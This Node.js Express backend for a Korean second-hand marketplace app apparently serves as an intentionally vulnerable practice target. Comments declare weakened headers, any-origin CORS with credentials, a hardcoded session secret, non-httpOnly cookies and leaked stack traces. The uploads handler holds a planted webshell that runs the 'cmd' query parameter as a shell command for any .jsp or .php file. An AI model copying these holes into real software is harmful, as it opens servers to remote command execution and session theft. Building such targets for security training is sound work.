// 자동 의존성 설치
const fs = require('fs');
const { execSync } = require('child_process');

// node_modules가 없으면 자동으로 npm install 실행
const nodeModulesPath = './node_modules';
const packageJsonPath = './package.json';

if (fs.existsSync(packageJsonPath) && !fs.existsSync(nodeModulesPath)) {
  console.log('🔧 의존성이 설치되지 않았습니다. 자동으로 설치합니다...');
  console.log('📍 현재 작업 디렉토리:', process.cwd());
  try {
    execSync('npm install', { stdio: 'inherit', cwd: process.cwd() });
    console.log('✅ 의존성 설치 완료!');
  } catch (error) {
    console.error('❌ 의존성 설치 실패:', error.message);
    // EJS가 없는 경우 개별 설치 시도
    try {
      console.log('🔧 EJS 개별 설치 시도...');
      execSync('npm install ejs', { stdio: 'inherit', cwd: process.cwd() });
      console.log('✅ EJS 설치 완료!');
    } catch (ejsError) {
      console.error('❌ EJS 설치도 실패:', ejsError.message);
      process.exit(1);
    }
  }
}

const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const fileupload = require("express-fileupload");
const path = require('path');
const { createServer } = require('http');
const socketio = require('socket.io');
const PortManager = require('./utils/portManager');
require('dotenv').config();

const { connectDB, sequelize } = require('./config/database');

// Import models
const User = require('./models/User');
const Product = require('./models/Product');
const Transaction = require('./models/Transaction');
const CommunityPost = require('./models/CommunityPost');
const Comment = require('./models/Comment');
const Coupon = require('./models/Coupon');
const UserCoupon = require('./models/UserCoupon');
const UserLikes = require('./models/UserLikes');
const CommunityPostLike = require('./models/CommunityPostLike');
const ChatMessage = require('./models/ChatMessage');
const ChatRoom = require('./models/ChatRoom');

// Import routes
const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/users');
const productRoutes = require('./routes/products');
const chatRoutes = require('./routes/chat');
const transactionRoutes = require('./routes/transactions');
const notificationRoutes = require('./routes/notifications');

const communityRoutes = require('./routes/community');
const uploadRoutes = require('./routes/upload');
const downloadRoutes = require('./routes/download');

// Import middleware
const authenticateToken = require('./middleware/authenticateToken');
const errorHandler = require('./middleware/errorHandler');

// Initialize model associations
const models = { 
  User, 
  Product, 
  Transaction, 
  CommunityPost, 
  Comment, 
  Coupon, 
  UserCoupon, 
  UserLikes, 
  CommunityPostLike, 
  ChatMessage,
  ChatRoom
};

// Set up associations after all models are loaded
Object.keys(models).forEach(modelName => {
  if (models[modelName] && models[modelName].associate) {
    models[modelName].associate(models);
  }
});

const app = express();

// EJS 템플릿 엔진 설정
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// 커스텀 EJS 적용 (communityHelpers 포함)
const customEjs = require('./utils/customEjs');
app.locals.ejs = customEjs;
app.locals.communityHelpers = customEjs.communityHelpers;

const httpServer = createServer(app);
const io = socketio(httpServer, {
  cors: {
    origin: [
      process.env.FRONTEND_URL || 'http://localhost:5173',
    ],
    methods: ['GET', 'POST'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization']
  },
  transports: ['polling', 'websocket'], // polling을 먼저 시도
  allowEIO3: true, // Engine.IO v3 호환성
  pingTimeout: 60000,
  pingInterval: 25000,
  upgradeTimeout: 10000,
  // Docker 환경을 위한 추가 설정
  allowEIO3: true,
  serveClient: false
});

// Track user room participation
const userRooms = new Map(); // userId -> Set of roomIds
const socketUsers = new Map(); // socketId -> userId

io.on('connection', (socket) => {
  console.log('=== NEW SOCKET CONNECTION ===');
  console.log('Socket.IO: User connected:', socket.id);
  console.log('Socket.IO: Transport:', socket.conn.transport.name);
  console.log('Socket.IO: Engine.IO version:', socket.conn.protocol);
  console.log('Socket.IO: Remote address:', socket.handshake.address);
  console.log('Socket.IO: Headers:', socket.handshake.headers);

  socket.on('joinRoom', (data) => {
    const roomId = data.roomId; // Use actual chat room ID
    const userId = data.userId;
    
    console.log(`[Socket.IO] joinRoom received:`, { roomId, userId, socketId: socket.id });
    
    // Store user info
    socket.userId = userId;
    socketUsers.set(socket.id, userId);
    
    // Track user's room participation
    if (!userRooms.has(userId)) {
      userRooms.set(userId, new Set());
    }
    userRooms.get(userId).add(roomId);
    
    socket.join(roomId);
    console.log(`[Socket.IO] User ${userId} (socket: ${socket.id}) joined room ${roomId}`);
    
    // Notify other users in the room that this user is online
    socket.to(roomId).emit('userJoinedRoom', { userId, roomId });
    console.log(`[Socket.IO] Emitted userJoinedRoom to room ${roomId} for user ${userId}`);
    
    // Also notify the joining user about other users already in the room
    const room = io.sockets.adapter.rooms[roomId];
    if (room) {
      const otherUsers = Object.keys(room.sockets).filter(socketId => socketId !== socket.id);
      console.log(`[Socket.IO] Room ${roomId} has ${otherUsers.length} other users:`, otherUsers);
      
      // Send list of online users to the newly joined user
      if (otherUsers.length > 0) {
        const onlineUserIds = otherUsers
          .map(socketId => socketUsers.get(socketId))
          .filter(userId => userId !== undefined);
        
        if (onlineUserIds.length > 0) {
          socket.emit('usersInRoom', { roomId, userIds: onlineUserIds });
          console.log(`[Socket.IO] Sent usersInRoom to user ${userId}:`, onlineUserIds);
        }
      }
    }
  });

  socket.on('sendMessage', async (data) => {
    console.log(`[Socket.IO] Received sendMessage from ${socket.id}:`, data);
    console.log(`[Socket.IO] Socket user ID:`, socket.userId);
    console.log(`[Socket.IO] Room ID:`, data.roomId);
    console.log(`[Socket.IO] Sender ID:`, data.senderId);
    console.log(`[Socket.IO] Receiver ID:`, data.receiverId);
    console.log(`[Socket.IO] Message:`, data.message);
    
    try {
      const receiverId = data.receiverId || null;
      if (!receiverId) {
        console.warn(`[Socket.IO] Missing receiverId in sendMessage payload for room ${data.roomId}`);
      }
      
      console.log(`[Socket.IO] Creating message in database...`);
      const message = await ChatMessage.create({
        sender_id: data.senderId,
        receiver_id: receiverId,
        room_id: data.roomId,
        message: data.message,
      });
      console.log(`[Socket.IO] Message created successfully:`, message.toJSON());
      
      console.log(`[Socket.IO] Emitting message to room ${data.roomId}...`);
      io.to(data.roomId).emit('message', message);
      console.log(`[Socket.IO] Message emitted to room ${data.roomId}`);
    } catch (error) {
      console.error('[Socket.IO] Error saving message:', error);
      console.error('[Socket.IO] Error details:', error.message);
      console.error('[Socket.IO] Error stack:', error.stack);
    }
  });

  socket.on('disconnect', (reason) => {
    console.log('Socket.IO: User disconnected:', socket.id, 'Reason:', reason);
    
    if (socket.userId) {
      // Notify all rooms that this user left
      const rooms = userRooms.get(socket.userId) || new Set();
      rooms.forEach(roomId => {
        socket.to(roomId).emit('userLeftRoom', { userId: socket.userId, roomId });
      });
      
      // Clean up tracking data
      userRooms.delete(socket.userId);
      socketUsers.delete(socket.id);
    }
  });
});

// Connect to database and initialize models
async function initializeApp() {
  try {
    // Connect to database first
    await connectDB();
    console.log('✅ Database connected and models synchronized');
  } catch (error) {
    console.error('❌ Failed to initialize database:', error);
    process.exit(1);
  }
}

// Initialize the app
initializeApp();

// Intentionally vulnerable: Weak security headers
app.use(helmet({
  contentSecurityPolicy: false, // Disabled for XSS vulnerabilities
  frameguard: false, // Disabled for clickjacking
  crossOriginResourcePolicy: { policy: 'cross-origin' },
  crossOriginEmbedderPolicy: false // Disable COEP for file downloads
}));

// CORS configuration (intentionally permissive)
app.use(cors({
  origin: true, // Allow all origins
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
}));

// Logging
app.use(morgan('dev'));

// File upload middleware
app.use(fileupload({ parseNested: true }));

// Body parsing
app.use(express.json({ limit: '50mb' })); // Intentionally high limit
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());

// Session configuration (intentionally weak)
app.use(session({
  secret: 'weak-secret-123', // Intentionally weak secret
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: false, // Not using HTTPS
    httpOnly: false, // Vulnerable to XSS
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));

// Modified static file serving - allow webshell execution and file downloads
app.use('/uploads', (req, res, next) => {
  // Set CORS headers for uploaded files
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Cross-Origin-Resource-Policy', 'cross-origin');
  
  // Handle Korean filename encoding
  const decodedPath = decodeURIComponent(req.path);
  req.url = decodedPath;
  
  const ext = path.extname(decodedPath).toLowerCase();
  
  // Force download if ?download=true is specified
  if (req.query.download === 'true') {
    const filename = path.basename(req.path);
    res.header('Content-Disposition', `attachment; filename="${filename}"`);
    next();
    return;
  }
  
  // Webshell execution: For JSP, PHP files - execute shell commands when accessed directly
  if (ext === '.jsp' || ext === '.php') {
    const cmd = req.query.cmd;
    if (cmd) {
      try {
        const { execSync } = require('child_process');
        console.log(`Executing command: ${cmd}`);
        const output = execSync(cmd, { encoding: 'utf8', timeout: 5000 });
        res.type('text/plain').send(`Command: ${cmd}\n\nOutput:\n${output}`);
        return;
      } catch (error) {
        res.type('text/plain').send(`Command: ${cmd}\n\nError:\n${error.message}`);
        return;
      }
    } else {
      res.type('text/plain').send('Webshell ready. Use ?cmd=<command> to execute commands.');
      return;
    }
  }
  
  // Set proper Content-Type for all files - support all extensions for download
  const mimeTypes = {
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',  
    '.png': 'image/png',
    '.gif': 'image/gif',
    '.pdf': 'application/pdf',
    '.doc': 'application/msword',
    '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    '.txt': 'text/plain',
    '.jsp': 'text/plain',
    '.php': 'text/plain',
    '.js': 'application/javascript',
    '.html': 'text/html',
    '.css': 'text/css',
    '.exe': 'application/octet-stream',
    '.zip': 'application/zip',
    '.rar': 'application/x-rar-compressed',
    '.7z': 'application/x-7z-compressed',
    '.xml': 'text/xml',
    '.json': 'application/json',
    '.sql': 'text/plain',
    '.bat': 'text/plain',
    '.cmd': 'text/plain',
    '.py': 'text/plain',
    '.java': 'text/plain',
    '.c': 'text/plain',
    '.cpp': 'text/plain',
    '.h': 'text/plain',
    '.log': 'text/plain'
  };
  
  if (mimeTypes[ext]) {
    res.header('Content-Type', mimeTypes[ext]);
  } else {
    // Unknown extensions - serve as downloadable binary
    res.header('Content-Type', 'application/octet-stream');
  }
  
  next();
}, express.static(path.join(__dirname, 'uploads'), {
  setHeaders: (res, path, stat) => {
    // Additional security headers for static files
    res.set('X-Content-Type-Options', 'nosniff');
  }
}));

// API Routes
app.use('/api/auth', authRoutes);
app.use('/api/users', userRoutes);
app.use('/api/products', productRoutes);
app.use('/api/chat', authenticateToken, chatRoutes);
app.use('/api/transactions', transactionRoutes);
app.use('/api/notifications', notificationRoutes);

app.use('/api/community', authenticateToken, communityRoutes);
app.use('/api/upload', authenticateToken, uploadRoutes);
app.use('/api/download', downloadRoutes);

// Health check endpoint
app.get('/api/health', async (req, res) => {
  try {
    // 데이터베이스 연결 테스트
    await sequelize.authenticate();
    const userCount = await User.count();
    const productCount = await Product.count();
    const communityPostCount = await CommunityPost.count();
    
    res.json({ 
      status: 'OK', 
      timestamp: new Date().toISOString(),
      database: {
        connected: true,
        users: userCount,
        products: productCount,
        communityPosts: communityPostCount
      },
      // Intentionally expose system information
      environment: process.env.NODE_ENV,
      version: process.env.npm_package_version,
      memory: process.memoryUsage(),
      uptime: process.uptime(),
      platform: process.platform,
      nodeVersion: process.version
    });
  } catch (error) {
    res.status(500).json({
      status: 'ERROR',
      timestamp: new Date().toISOString(),
      database: {
        connected: false,
        error: error.message
      },
      environment: process.env.NODE_ENV
    });
  }
});

// Root endpoint
app.get('/', (req, res) => {
  // EJS 모듈 존재 여부를 미리 체크
  let ejsExists = false;
  try {
    require.resolve('ejs');
    ejsExists = true;
  } catch (e) {
    ejsExists = false;
  }

  if (!ejsExists) {
    console.log('🔧 EJS 모듈이 없습니다. 런타임에 설치를 시도합니다...');
    try {
      execSync('npm install ejs', { stdio: 'inherit' });
      console.log('✅ EJS 런타임 설치 완료! 서버를 재시작해주세요.');
      res.json({
        message: 'EJS가 성공적으로 설치되었습니다. 서버를 재시작해주세요.',
        installed: true,
        restart_required: true
      });
    } catch (installError) {
      console.error('❌ EJS 런타임 설치 실패:', installError.message);
      res.json({
        success: false,
        message: 'EJS 설치에 실패했습니다',
        error: installError.message
      });
    }
  } else {
    // EJS가 있으면 정상 렌더링
    try {
      res.render('index', {
        platform: process.platform,
        nodeVersion: process.version,
        environment: process.env.NODE_ENV || 'development',
        uptime: process.uptime()
      });
    } catch (error) {
      res.json({
        success: false,
        message: 'EJS 렌더링 실패: ' + error.message,
        error: error
      });
    }
  }
});

// API root endpoint
app.get('/api', (req, res) => {
  res.json({
    message: 'Vintage Market API',
    endpoints: {
      auth: '/api/auth',
      users: '/api/users',
      products: '/api/products',
      chat: '/api/chat',
      transactions: '/api/transactions',
      notifications: '/api/notifications',
      community: '/api/community'
    }
  });
});

// Error handling middleware
app.use(errorHandler);

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    error: 'Not Found',
    message: `Cannot ${req.method} ${req.path}`,
    // Intentionally vulnerable: Stack trace exposure
    stack: new Error().stack
  });
});

// Enhanced server startup with port management
async function startServer() {
  const portManager = new PortManager();
  const preferredPort = parseInt(process.env.PORT) || 3000;
  const autoResolve = process.env.AUTO_RESOLVE_PORT === 'true' || process.argv.includes('--auto-resolve');
  
  try {
    console.log('🚀 Starting Vintage Market Backend Server...\n');
    
    let finalPort;
    
    if (autoResolve) {
      // Automatic port resolution mode
      console.log('🔧 Auto-resolve mode enabled');
      finalPort = await portManager.resolvePort(preferredPort, true);
    } else {
      // Manual port check mode
      const isAvailable = await portManager.isPortAvailable(preferredPort);
      
      if (isAvailable) {
        finalPort = preferredPort;
        console.log(`✅ Port ${preferredPort} is available`);
      } else {
        console.error(`❌ Port ${preferredPort} is already in use!`);
        
        // Generate resolution guide
        const guide = await portManager.generateResolutionGuide(preferredPort);
        console.log('\n📋 Port Conflict Resolution Options:');
        console.log('═'.repeat(50));
        
        guide.resolutionOptions.forEach((option, index) => {
          console.log(`\n${index + 1}. ${option.description}`);
          option.commands.forEach(cmd => {
            console.log(`   ${cmd}`);
          });
        });
        
        console.log('\n💡 Quick Solutions:');
        console.log(`   • Use alternative port: PORT=${guide.alternativePort} npm start`);
        console.log(`   • Auto-resolve conflicts: npm run start:auto`);
        console.log(`   • Kill conflicting process (${guide.platform}):`, 
          guide.platform === 'win32' 
            ? 'netstat -ano | findstr :3000, then taskkill /PID [PID] /F'
            : 'lsof -ti:3000 | xargs kill -9'
        );
        
        process.exit(1);
      }
    }
    
    // Start the server on the resolved port
    httpServer.listen(finalPort, () => {
      console.log(`
╔════════════════════════════════════════════════════╗
║                                                    ║
║   🛒 Vintage Market Backend Server                ║
║                                                    ║
║   Server running on port ${finalPort}${finalPort !== preferredPort ? ' (auto-resolved)' : ''}                ${finalPort !== preferredPort ? ' ' : ''}║
║   Environment: ${process.env.NODE_ENV || 'development'}                        ║
║   Platform: ${process.platform}                           ║
║                                                    ║
║   🌐 Access URLs:                                 ║
║   • Local: http://localhost:${finalPort}                  ║
║   • Network: http://0.0.0.0:${finalPort}                 ║
║                                                    ║
║   📍 API Endpoints:                               ║
║   • Health: /api/health                           ║
║   • Users: /api/users                             ║
║   • Products: /api/products                       ║
║                                                    ║
║                                                   ║
║                                                   ║
║                                                   ║
║                                                    ║
╚════════════════════════════════════════════════════╝
      `);
      
      if (finalPort !== preferredPort) {
        console.log(`ℹ️  Note: Server started on port ${finalPort} instead of ${preferredPort} due to port conflict`);
        console.log(`💡 To use the original port, run: npm run clean:ports && npm start`);
      }
    });
    
  } catch (error) {
    console.error('❌ Failed to start server:', error.message);
    console.log('\n🔧 Troubleshooting steps:');
    console.log('1. Check if another service is using the port');
    console.log('2. Try running with auto-resolve: npm run start:auto');
    console.log('3. Use a different port: PORT=3001 npm start');
    console.log('4. Clean up processes: npm run clean:ports');
    process.exit(1);
  }
}

// Handle graceful shutdown
process.on('SIGTERM', () => {
  console.log('\n🛑 Received SIGTERM, shutting down gracefully...');
  httpServer.close(() => {
    console.log('✅ Server closed successfully');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('\n🛑 Received SIGINT, shutting down gracefully...');
  httpServer.close(() => {
    console.log('✅ Server closed successfully');
    process.exit(0);
  });
});

// Start the server
if (require.main === module) {
  startServer();
}

module.exports = { app };